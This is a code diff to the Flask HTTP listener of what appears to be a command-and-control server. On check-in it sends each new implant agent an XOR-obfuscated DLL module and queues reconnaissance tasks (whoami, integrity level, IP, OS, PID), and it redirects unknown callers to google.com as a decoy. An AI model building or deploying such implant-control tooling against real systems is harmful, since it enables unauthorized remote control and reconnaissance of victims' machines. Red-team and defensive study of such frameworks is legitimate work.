@@ -1,7 +1,9 @@
 import json
+import os
 
+from connect.convert import string_to_base64, xor_base64
 from connect.output import display
-from connect.server.models import AgentModel, db, ImplantModel
+from connect.server.models import AgentModel, db, ImplantModel, TaskModel
 from flask import redirect, request, jsonify
 
 
@@ -30,13 +32,26 @@ class HTTPListenerRoutes:
             display('Retrieved implant authentication: ' + str(batch_response), 'INFORMATION')
             implant = ImplantModel.query.filter_by(key=batch_response['id']).first()
             if not implant:
-                display(f'Failed to find implant with id {id}', 'ERROR')
+                display(f'Failed to find implant with id {batch_response["id"]}', 'ERROR')
                 return redirect("https://www.google.com")
-            agent = AgentModel(implant=implant)
-            db.session.add(agent)
-            db.session.commit()
-            display(f'Created agent {agent.id} sending it to implant {implant.id}', 'INFORMATION')
-            return str(agent.check_in_task_id)
+            return self.create_agent(implant)
 
         batch_request = self.task_manager.parse_batch_response(batch_response)
         return jsonify(batch_request)
+
+    @staticmethod
+    def create_agent(implant):
+        agent = AgentModel(implant=implant)
+        module_bytes = open(f'{os.getcwd()}/resources/modules/SystemInformation.dll', 'rb').read()
+        module, key = xor_base64(module_bytes)
+        parameters = ','.join([string_to_base64(module), string_to_base64(key)])
+        load_task = TaskModel(agent=agent, method='load', type=0, parameters=parameters, misc='')
+        whoami_task = TaskModel(agent=agent, method='whoami', type=0, parameters='', misc='')
+        integrity_task = TaskModel(agent=agent, method='integrity', type=0, parameters='', misc='')
+        ip_task = TaskModel(agent=agent, method='ip', type=0, parameters='', misc='')
+        os_task = TaskModel(agent=agent, method='os', type=0, parameters='', misc='')
+        pid_task = TaskModel(agent=agent, method='pid', type=0, parameters='', misc='')
+        db.session.add_all([agent, load_task, whoami_task, integrity_task, ip_task, os_task, pid_task])
+        db.session.commit()
+        display(f'Created agent {agent.id} sending it to implant {implant.id}', 'INFORMATION')
+        return str(agent.check_in_task_id)
